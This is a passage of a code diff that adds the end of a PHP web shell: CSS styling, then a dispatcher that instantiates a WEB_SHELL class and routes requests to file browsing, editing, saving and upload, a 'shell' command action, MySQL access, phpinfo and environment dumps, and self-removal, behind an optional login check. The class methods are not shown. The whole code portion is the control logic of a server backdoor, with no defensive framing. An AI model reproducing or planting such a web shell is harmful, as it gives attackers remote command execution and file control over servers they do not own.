+A {  font-size: 12px; color: 000099; TEXT-DECORATION: none}
+
+
+.9p {  font-size: 12px }
+.10p {  font-size: 10pt}
+table {  font-size: 12px }
+.button {  font-size: 12px; border: 1px #000000 solid; background-color: 333333; height: 18px; cursor: hand}
+.editbox { font-size: 12px; border: 1px #000000 solid; background-color: #F8F8FF; height: 18px}
+.bigline {  font-size: 12px; line-height: 120%; letter-spacing: 1}
+.newmesg {  font-size: 12px; line-height: 120% }
+.code {
+	BACKGROUND-COLOR: #ffffff; BORDER-BOTTOM: #999999 1px solid; BORDER-LEFT: #999999 1px solid; BORDER-RIGHT: #999999 1px solid; BORDER-TOP: #999999 1px solid; COLOR: #cccccc; FONT-FAMILY: Verdana; FONT-SIZE: 12px; PADDING-BOTTOM: 2px; PADDING-LEFT: 2px; PADDING-RIGHT: 2px; PADDING-TOP: 2px
+}
+
+TEXTAREA {
+	BACKGROUND-COLOR: #ffffff; BORDER-BOTTOM: #999999 1px solid; BORDER-LEFT: #999999 1px solid; BORDER-RIGHT: #999999 1px solid; BORDER-TOP: #999999 1px solid; COLOR: #333333; FONT-SIZE: 10pt
+}
+INPUT {
+	BACKGROUND-COLOR: #ffffff; BORDER-BOTTOM: #999999 1px solid; BORDER-LEFT: #999999 1px solid; BORDER-RIGHT: #999999 1px solid; BORDER-TOP: #999999 1px solid; COLOR: #333333; FONT-SIZE: 10pt
+}
+SELECT {
+	BACKGROUND-COLOR: #ffffff; BORDER-BOTTOM: #999999 1px solid; BORDER-LEFT: #999999 1px solid; BORDER-RIGHT: #999999 1px solid; BORDER-TOP: #999999 1px solid; COLOR: #333333; FONT-SIZE: 10pt
+}
+
+.title
+{
+background:#f6f6f6;
+}
+.input_basic {
+	BORDER-RIGHT: #818181 1px solid; BORDER-TOP: #818181 1px solid; FONT-SIZE: 9pt; BORDER-LEFT: #818181 1px solid; COLOR: #000000; BORDER-BOTTOM: #818181 1px solid; FONT-FAMILY: \"Arial\", \"???\"; BACKGROUND-COLOR: #ffffff
+}.tb_1 {
+	border: 1px dashed #000099;
+	bordercolor:#dddddd;
+	margin: auto;
+	padding: 1px;
+	height: auto;
+	width: auto;
+}
+.style1 {color: #000099; font-weight: bold;}
+-->
+    
+</style>
+";
+$r_admin['style'] = $style;
+//echo "$style";
+
+// ---------------------------------------------------------------------
+//
+// 函数处理开始
+//
+// ---------------------------------------------------------------------
+$sd = new FUNC;
+$gb = new WEB_SHELL;
+
+$gb->input = $sd->getinput();
+
+// ---------------------------------------------------------------------
+//
+// 根据action的输入判断操作
+//
+// ---------------------------------------------------------------------
+if ($r_admin[flag] == "1")
+{
+      	if($gb->check_logined()); 
+	
+        else if($r_admin[pass] == "0")
+        {
+         echo "$style";
+	 $gb->show_login();
+       	 return;
+        }
+}
+switch ($gb->input['action'])
+{
+case 'fileman':
+	echo $gb->index();
+	break;
+
+case 'rename':
+	echo $gb->index();
+	break;
+
+case 'editfile':
+        echo "$style";
+	echo $gb->editfile();
+	break;
+
+case 'savefile':
+        echo "$style";
+	echo $gb->savefile();
+	break;
+
+case 'fileup':
+        echo "$style";
+	echo $gb->fileup();
+	break;
+
+case 'shell':
+        echo "$style";
+	echo $gb->shell();
+	break;
+
+case 'mysql':
+        echo "$style";
+	echo $gb->m_mysql();
+        break;
+
+case 'phpenv':
+        echo "$style";
+	echo $gb->phpenv();
+        break;
+
+
+case 'phpinfo1':
+        echo "$style";
+	echo $gb->phpinfo1();
+        break;
+
+case 'selfremover':
+        echo "$style";
+	echo $gb->index();
+        break;
+
+case 'logout':
+        echo "$style";
+	echo $gb->index();
+        break;
+
+case 'about':
+        echo "$style";
+	echo $gb->about();
+        break;
+
+default:
+	echo $gb->index();
+	break;
+}
+
+?>
+			
+                        
